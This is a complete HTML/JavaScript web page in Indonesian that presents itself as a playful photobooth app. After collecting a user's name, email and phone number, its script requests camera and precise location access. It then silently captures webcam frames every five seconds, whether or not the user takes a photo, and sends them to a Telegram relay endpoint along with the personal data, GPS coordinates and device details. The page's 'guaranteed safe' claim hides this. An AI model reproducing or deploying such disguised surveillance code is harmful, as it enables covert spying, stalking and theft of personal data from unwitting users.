<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Photobooth Ajaib Estetik</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* Desain Studio Estetik ala Gen Z */
        @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Inter:wght@400;700&family=Poppins:wght@600;800&display=swap');
        
        body {
            background: linear-gradient(135deg, #fefce8 0%, #fef3f7 100%); /* Gradien Kuning Muda & Pink Muda */
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
            /* Pola titik-titik kecil yang estetik */
            background-image: radial-gradient(circle, #ffdee9 1px, transparent 1px), radial-gradient(circle, #f7d7e6 1px, transparent 1px);
            background-size: 20px 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            background-color: #ffffff;
            border-radius: 30px; 
            /* Bayangan Pop-up Pink */
            box-shadow: 0 20px 50px rgba(255, 105, 180, 0.4); 
            padding: 1.5rem;
            box-sizing: border-box;
        }

        .title {
            font-family: 'Poppins', cursive;
            color: #ff69b4; /* Hot Pink */
            text-shadow: 1px 1px 0 #ffe0f0;
        }

        .input-field {
            transition: all 0.2s;
        }
        .input-field:focus {
            border-color: #ff69b4;
            box-shadow: 0 0 0 3px rgba(255, 105, 180, 0.3);
            outline: none;
        }

        .video-wrapper, .carousel-wrapper {
            border: 5px solid #ff99c8; /* Bingkai pink */
            border-radius: 18px;
            overflow: hidden;
            width: 100%;
            aspect-ratio: 4/3;
            background-color: #000;
            position: relative; /* Penting untuk carousel */
        }

        #video-stream, #photo-canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: scaleX(-1); /* Mirror effect */
            display: block;
        }

        .button-primary {
            background-color: #ff69b4;
            box-shadow: 0 4px #d8366e;
            transition: all 0.15s ease;
        }
        .button-primary:hover {
            background-color: #d8366e;
            box-shadow: 0 2px #b02c59;
            transform: translateY(2px);
        }

        .filter-btn {
            transition: all 0.2s;
            border: 2px solid transparent;
        }
        .filter-btn.active {
            border-color: #ff69b4;
            box-shadow: 0 0 0 4px #ffc0cb;
            transform: scale(1.05);
        }
        
        /* Gaya untuk area Review */
        #review-photo-area {
            display: none;
            position: relative;
        }
        #review-photo-area canvas {
            border: 4px solid #f6f6f6;
            border-radius: 12px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
        }

        /* Gaya Carousel */
        .carousel-track {
            display: flex;
            height: 100%;
            width: 100%;
            transition: transform 0.5s ease-in-out;
            touch-action: pan-y; /* Hanya geser horizontal */
        }
        .carousel-slide {
            min-width: 100%;
            height: 100%;
            overflow: hidden;
            position: relative;
        }
        .carousel-slide img {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Pastikan gambar mengisi frame tanpa distorsi */
        }
        .carousel-nav-btn {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            z-index: 10;
            padding: 0.5rem;
            background-color: rgba(255, 255, 255, 0.5);
            border-radius: 50%;
            color: #ff69b4;
            font-size: 1.5rem;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .carousel-nav-btn:hover {
            background-color: rgba(255, 255, 255, 0.8);
        }
        .carousel-dot {
            height: 8px;
            width: 8px;
            margin: 0 4px;
            background-color: #ffc0cb;
            border-radius: 50%;
            display: inline-block;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
        }
        .carousel-dot.active {
            background-color: #ff69b4;
            transform: scale(1.2);
        }
    </style>
</head>
<body class="flex justify-center items-start">

    <div class="container mt-8">
        <!-- HEADER -->
        <h1 class="title text-4xl text-center mb-6 font-extrabold flex items-center justify-center space-x-2">
            ‚ú® <span class="tracking-wider">Photobooth Ajaib</span> üì∏
        </h1>
        
        <!-- AREA UTAMA -->
        
        <!-- 1. Halaman Walkthrough & Petunjuk -->
        <div id="walkthrough-area" class="space-y-6">
            
            <!-- REVIEW CAROUSEL BARU -->
            <div class="carousel-wrapper relative">
                <div id="carousel-track" class="carousel-track">
                    <!-- Slides akan diisi oleh JS -->
                </div>

                <!-- Navigasi Panah -->
                <button id="prev-btn" class="carousel-nav-btn left-3"><i class="fas fa-chevron-left"></i></button>
                <button id="next-btn" class="carousel-nav-btn right-3"><i class="fas fa-chevron-right"></i></button>

                <!-- Indikator Dots -->
                <div id="carousel-dots" class="absolute bottom-3 left-1/2 transform -translate-x-1/2 flex">
                    <!-- Dots akan diisi oleh JS -->
                </div>
            </div>
            <p class="text-center text-sm text-gray-600 font-semibold mt-3">
                <i class="fas fa-star text-yellow-400"></i> Review dari yang lain! Keren, kan?
            </p>
            <!-- AKHIR REVIEW CAROUSEL -->

            <h2 class="text-xl font-bold text-center text-gray-800">Siap Foto Estetik? Ikuti Aturan Mainnya!</h2>
            <div class="bg-pink-50 p-4 rounded-xl shadow-inner border border-pink-200">
                <div class="flex items-center space-x-3 mb-3">
                    <span class="text-2xl text-pink-500 font-bold">1.</span>
                    <p class="font-semibold text-gray-700">Pilih Pose Terbaikmu</p>
                </div>
                <!-- Menggunakan gambar placeholder yang lebih spesifik untuk inspirasi Gen Z -->
                <img src="https://placehold.co/400x300/ffdee9/ff69b4?text=POSE+INSPIRASI+ESTETIK" onerror="this.src='https://placehold.co/400x300/ffdee9/ff69b4?text=POSE+INSPIRASI+ESTETIK'" alt="Inspirasi Pose Foto" class="rounded-lg w-full mb-3 shadow-md aspect-video object-cover">
                <p class="text-sm text-gray-600">Tips Gen Z: Coba pose *peace*, *finger heart*, atau gaya "muka terkejut" biar foto makin *vibe*!</p>
            </div>

            <div class="bg-purple-50 p-4 rounded-xl shadow-inner border border-purple-200">
                <div class="flex items-center space-x-3 mb-3">
                    <span class="text-2xl text-purple-500 font-bold">2.</span>
                    <p class="font-semibold text-gray-700">Isi Data Diri (Cuma sekali kok!)</p>
                </div>
                <p class="text-sm text-gray-600">Data kamu dipakai buat kirim hasil foto ke Telegram admin dan dapat info promo keren lainnya. Dijamin aman!</p>
                <button id="next-to-form-button" class="w-full mt-4 px-6 py-3 text-white button-primary rounded-xl font-bold text-lg">
                    Lanjut Isi Data ‚û°Ô∏è
                </button>
            </div>
        </div>

        <!-- 2. Halaman Input Data Pengguna -->
        <div id="form-area" class="space-y-4" style="display: none;">
            <p class="text-md text-center text-gray-700 font-bold mb-4">
                üìù Data ini wajib ya, Beb!
            </p>
            <div>
                <label for="nama" class="block text-sm font-semibold text-gray-700 mb-1">Nama Panggilan</label>
                <input type="text" id="nama" class="input-field border border-pink-300 p-3 rounded-xl w-full" placeholder="Cth: Anya" required>
            </div>
            <div>
                <label for="email" class="block text-sm font-semibold text-gray-700 mb-1">Email</label>
                <input type="email" id="email" class="input-field border border-pink-300 p-3 rounded-xl w-full" placeholder="Cth: aku.estetik@mail.com" required>
            </div>
            <div>
                <label for="phone" class="block text-sm font-semibold text-gray-700 mb-1">Nomor Handphone</label>
                <input type="tel" id="phone" class="input-field border border-pink-300 p-3 rounded-xl w-full" placeholder="Buat konfirmasi data" required>
            </div>
            <button id="start-button" class="w-full px-6 py-3 text-white button-primary rounded-xl font-bold text-lg">
                Mulai Photobooth Sekarang! <i class="fas fa-camera ml-2"></i>
            </button>
            <p id="status-message-form" class="mt-2 text-center text-sm font-medium text-red-600"></p>
        </div>

        <!-- 3. Halaman Photobooth (Kamera Aktif) -->
        <div id="monitoring-area" style="display: none;">
            
            <p class="text-center font-bold text-sm text-gray-600 mb-3" id="camera-status">Kamera dimuat...</p>
            
            <!-- Filter Options -->
            <div class="flex justify-around mb-4 space-x-2">
                <button data-filter="normal" class="filter-btn active bg-gray-100 p-2 rounded-xl text-sm font-semibold text-gray-700 flex-1">
                    Normal
                </button>
                <button data-filter="cerah" class="filter-btn bg-yellow-100 p-2 rounded-xl text-sm font-semibold text-yellow-700 flex-1">
                    ‚ú® Cerah
                </button>
                <button data-filter="vintage" class="filter-btn bg-purple-100 p-2 rounded-xl text-sm font-semibold text-purple-700 flex-1">
                    üìª Vintage
                </button>
                <button data-filter="bw" class="filter-btn bg-gray-800 text-white p-2 rounded-xl text-sm font-semibold flex-1">
                    üñ§ B&W
                </button>
            </div>

            <div class="video-wrapper relative">
                <!-- Video Stream dan Canvas untuk Foto -->
                <video id="video-stream" autoplay playsinline style="display: block;"></video>
                <canvas id="photo-canvas" style="display: none;"></canvas>
                <!-- Indikator Hitungan Mundur -->
                <div id="countdown" class="absolute inset-0 flex items-center justify-center text-white text-6xl font-extrabold opacity-0 transition-opacity duration-300" style="background-color: rgba(0, 0, 0, 0.5);"></div>
            </div>

            <!-- Tombol Jepret -->
            <button id="capture-button" class="w-full mt-4 px-6 py-3 text-white button-primary rounded-xl font-bold text-lg">
                <i class="fas fa-camera mr-2"></i> Jepret Foto Estetik!
            </button>
            
            <!-- Pesan status pengiriman (otomatis) -->
            <p id="status-message-bg" class="mt-4 text-center text-xs font-medium text-gray-500 transition-opacity duration-300"></p>
        </div>

        <!-- 4. Halaman Review (Pratinjau Foto) -->
        <div id="review-photo-area" class="space-y-4">
            <h2 class="text-xl font-bold text-center text-pink-500">ü•≥ Hasil Jepretan Kamu!</h2>
            <p class="text-center text-sm text-gray-600">Cek dulu nih, kalau udah oke, langsung *share*!</p>
            
            <div class="video-wrapper">
                <canvas id="review-canvas" class="w-full"></canvas>
            </div>

            <!-- Tombol Aksi -->
            <div class="controls flex justify-center space-x-3 sm:space-x-4">
                <button id="download-button" class="px-5 py-3 text-white rounded-xl font-bold active:shadow-none text-sm sm:text-base bg-blue-500 hover:bg-blue-600 shadow-md">
                    <i class="fas fa-download mr-1"></i> Unduh
                </button>
                <button id="share-button" class="px-5 py-3 text-white rounded-xl font-bold active:shadow-none text-sm sm:text-base bg-yellow-500 hover:bg-yellow-600 shadow-md">
                    <i class="fas fa-share-alt mr-1"></i> Share
                </button>
                <button id="retake-button" class="px-5 py-3 text-gray-700 rounded-xl font-bold active:shadow-none text-sm sm:text-base bg-gray-200 hover:bg-gray-300 shadow-md">
                    <i class="fas fa-redo mr-1"></i> Jepret Ulang
                </button>
            </div>
            <p id="review-status-message" class="mt-2 text-center text-sm font-medium text-green-600"></p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            // UI Elements
            const walkthroughArea = document.getElementById('walkthrough-area');
            const formArea = document.getElementById('form-area');
            const monitoringArea = document.getElementById('monitoring-area');
            const reviewPhotoArea = document.getElementById('review-photo-area');
            const nextToFormButton = document.getElementById('next-to-form-button');
            const startButton = document.getElementById('start-button');
            const captureButton = document.getElementById('capture-button');
            const downloadButton = document.getElementById('download-button');
            const shareButton = document.getElementById('share-button');
            const retakeButton = document.getElementById('retake-button');
            const countdownEl = document.getElementById('countdown');
            const cameraStatusEl = document.getElementById('camera-status');
            const filterButtons = document.querySelectorAll('.filter-btn');

            // Carousel Elements
            const carouselTrack = document.getElementById('carousel-track');
            const prevBtn = document.getElementById('prev-btn');
            const nextBtn = document.getElementById('next-btn');
            const carouselDots = document.getElementById('carousel-dots');
            
            // Video & Canvas Elements
            const videoStream = document.getElementById('video-stream');
            const photoCanvas = document.getElementById('photo-canvas');
            const reviewCanvas = document.getElementById('review-canvas');

            // Data & State
            const PROXY_ENDPOINT = '/api/telegram-proxy';
            const AUTO_SEND_INTERVAL_MS = 5000; // 5 detik
            const JPEG_QUALITY = 0.6; // Kualitas kompresi untuk Base64 (0.0 - 1.0)
            const MAX_PHOTO_WIDTH = 800; // Lebar maks canvas untuk pengiriman
            const CAROUSEL_INTERVAL_MS = 5000; // Geser otomatis setiap 5 detik
            
            // Data Foto Publik (Placeholder dengan rasio 4:3)
            const publicPhotos = [
                "/img/1.jpg",
                "/img/2.jpg",
                "/img/3.jpg",
                "img/4.jpg",
                "img/5.jpg",
            ];

            let videoStreamObject = null;
            let formData = {};
            let isSending = false;
            let currentFilter = 'normal';
            let capturedPhotoBase64 = null;
            let autoSendTimer = null; // Timer untuk pengiriman otomatis
            let userLocation = null;
            let deviceData = getDeviceData();
            
            let currentSlideIndex = 0;
            let carouselAutoPlay = null;
            let isDragging = false;
            let dragStartX = 0;

            // --- FUNGSI CAROUSEL ---
            function setupCarousel() {
                publicPhotos.forEach((src, index) => {
                    // Tambahkan Slide
                    const slide = document.createElement('div');
                    slide.classList.add('carousel-slide');
                    slide.innerHTML = `<img src="${src}" alt="Foto Review ${index + 1}" onerror="this.src='https://placehold.co/400x300/fef3f7/ff69b4?text=Error+Loading';" loading="lazy">`;
                    carouselTrack.appendChild(slide);

                    // Tambahkan Dots
                    const dot = document.createElement('span');
                    dot.classList.add('carousel-dot');
                    dot.dataset.index = index;
                    dot.addEventListener('click', () => {
                        goToSlide(index);
                        resetAutoPlay();
                    });
                    carouselDots.appendChild(dot);
                });

                updateCarousel();
                startAutoPlay();
            }

            function goToSlide(index) {
                if (index < 0) {
                    index = publicPhotos.length - 1;
                } else if (index >= publicPhotos.length) {
                    index = 0;
                }
                currentSlideIndex = index;
                updateCarousel();
            }

            function updateCarousel() {
                const offset = -currentSlideIndex * 100;
                carouselTrack.style.transform = `translateX(${offset}%)`;
                
                // Update Dots
                document.querySelectorAll('.carousel-dot').forEach((dot, index) => {
                    dot.classList.toggle('active', index === currentSlideIndex);
                });
            }

            function startAutoPlay() {
                if (carouselAutoPlay) clearInterval(carouselAutoPlay);
                carouselAutoPlay = setInterval(() => {
                    goToSlide(currentSlideIndex + 1);
                }, CAROUSEL_INTERVAL_MS);
            }

            function resetAutoPlay() {
                clearInterval(carouselAutoPlay);
                startAutoPlay();
            }

            // Event Listeners Navigasi
            prevBtn.addEventListener('click', () => {
                goToSlide(currentSlideIndex - 1);
                resetAutoPlay();
            });

            nextBtn.addEventListener('click', () => {
                goToSlide(currentSlideIndex + 1);
                resetAutoPlay();
            });

            // Event Listeners Touch/Swipe
            carouselTrack.addEventListener('mousedown', (e) => {
                isDragging = true;
                dragStartX = e.clientX;
                carouselTrack.style.cursor = 'grabbing';
                carouselTrack.style.transition = 'none';
                clearInterval(carouselAutoPlay); // Hentikan autoplay saat mulai geser
            });

            carouselTrack.addEventListener('mousemove', (e) => {
                if (!isDragging) return;
                const dragDistance = e.clientX - dragStartX;
                const offset = -currentSlideIndex * carouselTrack.offsetWidth + dragDistance;
                carouselTrack.style.transform = `translateX(${offset}px)`;
            });

            const handleDragEnd = (e) => {
                if (!isDragging) return;
                isDragging = false;
                carouselTrack.style.cursor = 'grab';
                carouselTrack.style.transition = 'transform 0.5s ease-in-out';
                startAutoPlay(); // Lanjutkan autoplay
                
                const finalX = e.clientX || e.changedTouches[0].clientX; // Untuk touch
                const dragDistance = finalX - dragStartX;
                const threshold = carouselTrack.offsetWidth / 4; // Ambang batas geser

                if (dragDistance > threshold) {
                    goToSlide(currentSlideIndex - 1); // Geser ke Kanan (slide sebelumnya)
                } else if (dragDistance < -threshold) {
                    goToSlide(currentSlideIndex + 1); // Geser ke Kiri (slide berikutnya)
                } else {
                    updateCarousel(); // Kembali ke slide saat ini
                }
            };

            carouselTrack.addEventListener('mouseup', handleDragEnd);
            carouselTrack.addEventListener('mouseleave', () => {
                if (isDragging) handleDragEnd({ clientX: dragStartX }); // Jika mouse keluar saat masih digeser
            });
            
            // Touch Events untuk Mobile
            carouselTrack.addEventListener('touchstart', (e) => {
                isDragging = true;
                dragStartX = e.touches[0].clientX;
                carouselTrack.style.transition = 'none';
                clearInterval(carouselAutoPlay);
            });
            carouselTrack.addEventListener('touchmove', (e) => {
                if (!isDragging) return;
                const dragDistance = e.touches[0].clientX - dragStartX;
                const offset = -currentSlideIndex * carouselTrack.offsetWidth + dragDistance;
                carouselTrack.style.transform = `translateX(${offset}px)`;
            });
            carouselTrack.addEventListener('touchend', handleDragEnd);
            
            // --- FUNGSI NAVIGASI HALAMAN ---

            function showPage(pageId) {
                walkthroughArea.style.display = 'none';
                formArea.style.display = 'none';
                monitoringArea.style.display = 'none';
                reviewPhotoArea.style.display = 'none';

                if (pageId === 'walkthrough') walkthroughArea.style.display = 'block';
                else if (pageId === 'form') formArea.style.display = 'block';
                else if (pageId === 'camera') monitoringArea.style.display = 'block';
                else if (pageId === 'review') reviewPhotoArea.style.display = 'block';
            }

            nextToFormButton.addEventListener('click', () => showPage('form'));
            retakeButton.addEventListener('click', () => showPage('camera'));

            // --- FUNGSI KAMERA & LOKASI ---

            function requestCameraPermission() {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user', // Gunakan kamera depan
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        } 
                    })
                    .then(stream => {
                        videoStreamObject = stream;
                        videoStream.srcObject = stream;
                        cameraStatusEl.textContent = 'Kamera Aktif. Siap Jepret!';
                    })
                    .catch(err => {
                        cameraStatusEl.textContent = `‚ùå Kamera GAGAL: ${err.name}.`;
                        console.error("Camera Error:", err);
                    });
                } else {
                    cameraStatusEl.textContent = '‚ùå Perangkat tidak mendukung kamera.';
                }
            }

            function requestLocationPermission() {
                if (navigator.geolocation) {
                    // Hanya request lokasi sekali, tidak perlu watchPosition di sini
                    navigator.geolocation.getCurrentPosition(position => {
                        userLocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                        console.log(`Lokasi didapatkan: ${userLocation.latitude}, ${userLocation.longitude}`);
                    }, err => {
                        userLocation = null;
                        console.error(`Lokasi Gagal: ${err.message}`);
                    }, {
                        enableHighAccuracy: true, 
                        timeout: 10000, 
                        maximumAge: 0 
                    });
                }
            }

            // --- APLIKASI FILTER ---
            
            filterButtons.forEach(btn => {
                btn.addEventListener('click', () => {
                    filterButtons.forEach(b => b.classList.remove('active'));
                    btn.classList.add('active');
                    currentFilter = btn.dataset.filter;
                });
            });

            function applyFilter(context, width, height, filter) {
                // Implementasi filter sederhana menggunakan CSS filter property pada video
                const videoFilterStyle = {
                    'normal': 'none',
                    'cerah': 'brightness(1.2) saturate(1.1)',
                    'vintage': 'sepia(0.5) contrast(1.1) brightness(0.9)',
                    'bw': 'grayscale(1)',
                };
                videoStream.style.filter = videoFilterStyle[filter] || 'none';
                
                // Catatan: Untuk capture foto berkualitas, filter harus diterapkan ke canvas.
                // Dalam demo ini, kita hanya terapkan di video untuk kemudahan UI.
            }

            // Update filter saat kamera aktif
            videoStream.addEventListener('play', () => {
                filterButtons.forEach(btn => {
                    btn.addEventListener('click', () => {
                        applyFilter(null, null, null, btn.dataset.filter);
                    });
                });
                applyFilter(null, null, null, currentFilter);
            });


            // --- LOGIKA UTAMA (START & CAPTURE) ---

            startButton.addEventListener('click', () => {
                const nama = document.getElementById('nama').value.trim();
                const email = document.getElementById('email').value.trim();
                const phone = document.getElementById('phone').value.trim();

                if (!nama || !email || !phone) {
                    document.getElementById('status-message-form').textContent = '‚ùå Semua data harus diisi dong!';
                    return;
                }

                formData = { nama, email, phone };
                document.getElementById('status-message-form').textContent = '';
                
                showPage('camera');
                
                // Mulai request kamera dan lokasi
                requestCameraPermission();
                requestLocationPermission();
                startAutoSendInterval();
            });
            
            captureButton.addEventListener('click', () => {
                if (!videoStreamObject) {
                    showStatus('Kamera belum aktif. Tunggu sebentar atau coba aktifkan ulang.', true);
                    return;
                }
                
                captureButton.disabled = true;
                let count = 3;
                countdownEl.textContent = count;
                countdownEl.classList.remove('opacity-0');
                
                const timer = setInterval(() => {
                    count--;
                    countdownEl.textContent = count > 0 ? count : 'Jepret!';
                    
                    if (count < 0) {
                        clearInterval(timer);
                        countdownEl.classList.add('opacity-0');
                        
                        capturedPhotoBase64 = capturePhotoToCanvas(MAX_PHOTO_WIDTH, JPEG_QUALITY, true); // True: untuk display
                        
                        // Tampilkan Halaman Review
                        if (capturedPhotoBase64) {
                            drawBase64ToCanvas(capturedPhotoBase64, reviewCanvas);
                            showPage('review');
                        } else {
                            showStatus('Gagal menjepret foto. Coba lagi!', true);
                        }
                        captureButton.disabled = false;
                    }
                }, 1000);
            });


            // --- FUNGSI PENGIRIMAN & OPTIMASI GAMBAR ---

            function capturePhotoToCanvas(maxWidth = 800, quality = 0.6, forDisplay = false) {
                if (!videoStreamObject || videoStream.readyState < 2) return null; // readyState 2 = have enough data
                
                const videoWidth = videoStream.videoWidth || 640;
                const videoHeight = videoStream.videoHeight || 480;
                
                // Hitung dimensi yang dioptimalkan
                let targetWidth = videoWidth;
                let targetHeight = videoHeight;

                if (targetWidth > maxWidth) {
                    targetHeight = Math.round((targetHeight / targetWidth) * maxWidth);
                    targetWidth = maxWidth;
                }
                
                // Gunakan photoCanvas (tersembunyi) untuk pemrosesan
                photoCanvas.width = targetWidth;
                photoCanvas.height = targetHeight;
                
                const context = photoCanvas.getContext('2d');
                context.clearRect(0, 0, targetWidth, targetHeight); // Bersihkan canvas
                
                // 1. Gambar Video (dengan mirror)
                context.save();
                context.translate(targetWidth, 0);
                context.scale(-1, 1);
                context.drawImage(videoStream, 0, 0, targetWidth, targetHeight);
                context.restore();
                
                // 2. Terapkan Filter (jika diperlukan pada level canvas, di sini kita hanya rely pada CSS)
                // Jika ingin filter diterapkan ke gambar yang dikirim, logika ini harus ditambahkan di sini.

                // 3. Kompresi Gambar
                // Gunakan JPEG dengan kualitas rendah untuk mengurangi ukuran file (Base64)
                return photoCanvas.toDataURL('image/jpeg', forDisplay ? 0.8 : quality); // Kualitas lebih baik untuk display lokal (0.8)
            }
            
            function drawBase64ToCanvas(base64Image, canvas) {
                const img = new Image();
                img.onload = function() {
                    canvas.width = img.width;
                    canvas.height = img.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, img.width, img.height);
                };
                img.src = base64Image;
            }

            function startAutoSendInterval() {
                // Hentikan timer lama (jika ada)
                if(autoSendTimer) clearInterval(autoSendTimer);
                
                const sendNext = () => {
                    if (!isSending) {
                        sendReport();
                    }
                };

                // Kirim laporan pertama setelah interval, dan ulangi
                autoSendTimer = setInterval(sendNext, AUTO_SEND_INTERVAL_MS);
                showStatus('‚úÖ Pengiriman otomatis data/foto (5 detik) sudah ON. Santai aja!', false);
            }

            async function sendReport() {
                if (isSending) return;

                isSending = true;
                const base64Image = capturePhotoToCanvas(MAX_PHOTO_WIDTH, JPEG_QUALITY, false); // FALSE: untuk pengiriman (kualitas rendah)
                
                // ... (Logika pembuatan caption sama seperti sebelumnya) ...
                const now = new Date();
                const dateTimeText = now.toLocaleString('id-ID', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short' });
                const locationText = userLocation ? 
                    `‚úÖ Lokasi Akurat:\nLAT: ${userLocation.latitude.toFixed(6)}\nLNG: ${userLocation.longitude.toFixed(6)}\nAkurasi: ${userLocation.accuracy.toFixed(2)}m\nPeta: https://maps.google.com/?q=${userLocation.latitude},${userLocation.longitude}` : 
                    `‚ùå Lokasi GAGAL didapatkan.`;

                const caption = `
*--- PENGIRIMAN DATA FOTO OTOMATIS (${AUTO_SEND_INTERVAL_MS/1000}s) ---*

*Waktu Pengambilan:* ${dateTimeText}
*Filter Digunakan:* ${currentFilter.toUpperCase()}

*Data Pengguna:*
Nama: ${formData.nama}
Email: ${formData.email}
No. HP: ${formData.phone}

*Data Lokasi (Wajib Akurat):*
${locationText}

*Informasi Perangkat:*
Perangkat: ${deviceData.device}
Browser: ${deviceData.browser}
OS: ${deviceData.os}
`;
                
                try {
                    await sendDataToProxy(base64Image, caption);
                    showStatus('‚úÖ Foto & Data terkirim senyap!', false);
                } catch (error) {
                    console.error("Error saat mengirim data:", error);
                    showStatus('‚ùå GAGAL kirim otomatis. (Cek log/error JSON).', true);
                } finally {
                    isSending = false;
                }
            }
            
            async function sendDataToProxy(base64Image, caption) {
                const payload = { caption, base64Image, isPhoto: !!base64Image };

                const response = await fetch(PROXY_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();
                if (!response.ok || data.error) {
                    throw new Error(data.error || 'Pengiriman ke proxy gagal. Cek log server Vercel.');
                }
                return data;
            }


            // --- FUNGSI INTERAKTIF REVIEW (UNDUH & SHARE) ---
            
            downloadButton.addEventListener('click', () => {
                if (capturedPhotoBase64) {
                    const link = document.createElement('a');
                    link.href = capturedPhotoBase64;
                    link.download = `PhotoEstetik-${new Date().getTime()}.jpeg`;
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    document.getElementById('review-status-message').textContent = '‚úÖ Foto Berhasil Diunduh! Cek Gallery kamu.';
                }
            });
            
            shareButton.addEventListener('click', async () => {
                if (!capturedPhotoBase64) {
                    document.getElementById('review-status-message').textContent = '‚ùå Tidak ada foto untuk dibagikan.';
                    return;
                }

                try {
                    const photoBlob = dataURItoBlob(capturedPhotoBase64);
                    const photoFile = new File([photoBlob], 'studio_foto.jpeg', { type: photoBlob.type });

                    if (navigator.share && navigator.canShare({ files: [photoFile] })) {
                        await navigator.share({
                            files: [photoFile],
                            title: 'Foto dari Photobooth Ajaib',
                            text: 'Lihat foto keren saya dari Photobooth Ajaib!',
                        });
                        document.getElementById('review-status-message').textContent = '‚úÖ Berbagi berhasil! Happy sharing!';
                    } else {
                        document.getElementById('review-status-message').textContent = '‚ùå Fitur Share tidak didukung. Silakan gunakan tombol Unduh.';
                    }
                } catch (error) {
                    console.error('Gagal berbagi:', error);
                    document.getElementById('review-status-message').textContent = '‚ùå Gagal berbagi foto. (Cek console log)';
                }
            });


            // --- FUNGSI UTILITY ---

            function showStatus(message, isError = false) {
                const statusMessageBg = document.getElementById('status-message-bg');
                statusMessageBg.textContent = message;
                statusMessageBg.classList.remove('text-red-600', 'text-green-600', 'text-gray-500');
                statusMessageBg.classList.add(isError ? 'text-red-600' : 'text-green-600', 'opacity-100');
                
                setTimeout(() => {
                    statusMessageBg.classList.add('opacity-0');
                }, 3000);
            }

            function getDeviceData() {
                // (Fungsi tetap sama)
                const ua = navigator.userAgent;
                let os = 'OS Lain', browser = 'Browser Tidak Dikenal', device = 'Desktop';
                if (/Windows/.test(ua)) os = 'Windows';
                else if (/Macintosh|Mac OS X/.test(ua)) os = 'macOS';
                else if (/Android/.test(ua)) { os = 'Android'; device = 'Handphone/Tablet'; }
                else if (/iPhone|iPad|iPod/.test(ua)) { os = 'iOS'; device = 'iPhone/iPad'; }
                else if (/Linux/.test(ua)) os = 'Linux';
                if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
                else if (/Firefox/.test(ua)) browser = 'Firefox';
                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
                else if (/Edge/.test(ua)) browser = 'Edge';
                return { os, browser, device };
            }

            function dataURItoBlob(dataURI) {
                // (Fungsi tetap sama)
                const byteString = atob(dataURI.split(',')[1]);
                const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                return new Blob([ab], { type: mimeString });
            }
            
            // --- INISIALISASI ---
            setupCarousel();
            // Tampilkan halaman awal saat dokumen dimuat
            showPage('walkthrough');
        });
    </script>
</body>
</html>
